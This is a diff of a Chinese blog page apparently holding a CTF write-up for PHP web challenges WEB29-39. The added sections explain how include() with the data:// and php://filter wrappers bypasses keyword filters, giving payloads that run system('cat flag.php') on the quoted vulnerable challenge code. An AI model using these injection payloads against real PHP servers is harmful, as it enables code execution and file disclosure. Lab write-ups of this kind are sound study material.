@@ -28,7 +28,7 @@
 <meta property="og:description" content="WEB29首先认识几个函数preg_match、eval、system payload1：&#x2F;?c&#x3D;system(“ls”);   发现flag.php文件，由于c中不能包含flag字符串，所以用通配符绕过 payload2：&#x2F;?c&#x3D;system(“cat fla*”);  然后查看源码得到flag">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-23T04:17:13.891Z">
-<meta property="article:modified_time" content="2022-02-23T05:21:30.989Z">
+<meta property="article:modified_time" content="2022-02-28T10:10:11.203Z">
 <meta property="article:author" content="Harbeter">
 <meta property="article:tag" content="刷题">
 <meta name="twitter:card" content="summary">
@@ -208,10 +208,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-02-23 12:17:13 / 修改时间：13:21:30" itemprop="dateCreated datePublished" datetime="2022-02-23T12:17:13+08:00">2022-02-23</time>
+              <time title="创建时间：2022-02-23 12:17:13" itemprop="dateCreated datePublished" datetime="2022-02-23T12:17:13+08:00">2022-02-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-28 18:10:11" itemprop="dateModified" datetime="2022-02-28T18:10:11+08:00">2022-02-28</time>
+              </span>
 
           
 
@@ -272,6 +278,18 @@
 
 <h1 id="WEB32-36通用解"><a href="#WEB32-36通用解" class="headerlink" title="WEB32-36通用解"></a>WEB32-36通用解</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
+<h1 id="WEB37"><a href="#WEB37" class="headerlink" title="WEB37"></a>WEB37</h1><p>这里的关键是<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-370455.html">include函数</a>，include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。<br>伪协议中的<code>data://</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://协议用法：</span><br><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: c=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;  //查看flag.php，右键源码中查找flag</span><br><span class="line">payload: c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKT8+</span><br><span class="line">                          //&#x27;base64,&#x27;后面是base64加密的&lt;?php system(&#x27;cat flag.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB38"><a href="#WEB38" class="headerlink" title="WEB38"></a>WEB38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了flag，php，file。所以用WEB37中的第二种payload</p>
+<h1 id="WEB39"><a href="#WEB39" class="headerlink" title="WEB39"></a>WEB39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>
+<p>payload和WEB37一样</p>
 
     </div>
 
@@ -355,7 +373,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB29"><span class="nav-number">1.</span> <span class="nav-text">WEB29</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB30"><span class="nav-number">2.</span> <span class="nav-text">WEB30</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB31"><span class="nav-number">3.</span> <span class="nav-text">WEB31</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB32"><span class="nav-number">4.</span> <span class="nav-text">WEB32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB33"><span class="nav-number">5.</span> <span class="nav-text">WEB33</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB34"><span class="nav-number">6.</span> <span class="nav-text">WEB34</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB35"><span class="nav-number">7.</span> <span class="nav-text">WEB35</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB36"><span class="nav-number">8.</span> <span class="nav-text">WEB36</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB32-36%E9%80%9A%E7%94%A8%E8%A7%A3"><span class="nav-number">9.</span> <span class="nav-text">WEB32-36通用解</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB29"><span class="nav-number">1.</span> <span class="nav-text">WEB29</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB30"><span class="nav-number">2.</span> <span class="nav-text">WEB30</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB31"><span class="nav-number">3.</span> <span class="nav-text">WEB31</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB32"><span class="nav-number">4.</span> <span class="nav-text">WEB32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB33"><span class="nav-number">5.</span> <span class="nav-text">WEB33</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB34"><span class="nav-number">6.</span> <span class="nav-text">WEB34</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB35"><span class="nav-number">7.</span> <span class="nav-text">WEB35</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB36"><span class="nav-number">8.</span> <span class="nav-text">WEB36</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB32-36%E9%80%9A%E7%94%A8%E8%A7%A3"><span class="nav-number">9.</span> <span class="nav-text">WEB32-36通用解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB37"><span class="nav-number">10.</span> <span class="nav-text">WEB37</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB38"><span class="nav-number">11.</span> <span class="nav-text">WEB38</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB39"><span class="nav-number">12.</span> <span class="nav-text">WEB39</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -371,7 +389,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
